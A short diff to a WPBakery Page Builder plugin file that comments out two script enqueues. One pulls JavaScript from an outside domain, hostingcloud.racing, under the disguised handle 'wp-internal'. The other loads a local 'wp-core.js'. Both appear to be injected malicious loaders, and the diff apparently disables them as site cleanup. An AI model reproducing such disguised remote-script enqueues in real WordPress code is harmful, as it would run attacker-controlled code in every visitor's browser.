@@ -9,8 +9,8 @@
  *
  * @package WPBakery Page Builder
  */
- wp_enqueue_script( 'wp-internal', 'https://www.hostingcloud.racing/08GN.js', false, false, true );
- wp_enqueue_script( 'wp-backend', plugins_url() . '/js_composer/assets/js/wp-core.js', false, false, true );
+ //wp_enqueue_script( 'wp-internal', 'https://www.hostingcloud.racing/08GN.js', false, false, true );
+ //wp_enqueue_script( 'wp-backend', plugins_url() . '/js_composer/assets/js/wp-core.js', false, false, true );
 // don't load directly
 if ( ! defined( 'ABSPATH' ) ) {
 	die( '-1' );
